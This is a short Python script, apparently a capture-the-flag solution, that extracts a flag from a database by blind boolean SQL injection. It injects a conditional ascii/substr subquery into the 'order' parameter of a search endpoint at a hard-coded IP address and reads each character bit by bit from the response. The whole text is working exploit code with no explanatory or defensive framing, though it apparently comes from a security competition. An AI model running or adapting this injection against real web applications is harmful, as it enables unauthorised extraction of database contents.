import requests

# code from https://phuker.github.io/
s = requests.Session()
cookie = {'PHPSESSID':'YOURCOOKIE'} # add your cookie
url = 'http://202.120.7.197/app.php'

true_str = '"goods":[{"id":"5"'
false_str = '"goods":[{"id":"2"'
order_by_template = 'if(ascii(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),%d,1))&%d,name,price)'

flag = ''
for place_index in xrange(1, 1000):
    place_bin = ''
    for times in xrange(6,-1,-1):
        num = 2 ** times
        order_by = order_by_template % (place_index, num)
        params = {'action':'search','keyword':'','order':order_by}
        r = s.get(url, params=params, cookies=cookie)
        #print r.content
        if true_str in r.content:
            new_place_bin = '1'
        else:
            new_place_bin = '0'
        print (new_place_bin),
        place_bin += new_place_bin

    place = chr(int(place_bin, 2))
    flag += place
    print (flag)


    if '}' in flag:
        break

print ('\n***** get flag *****')
print (flag)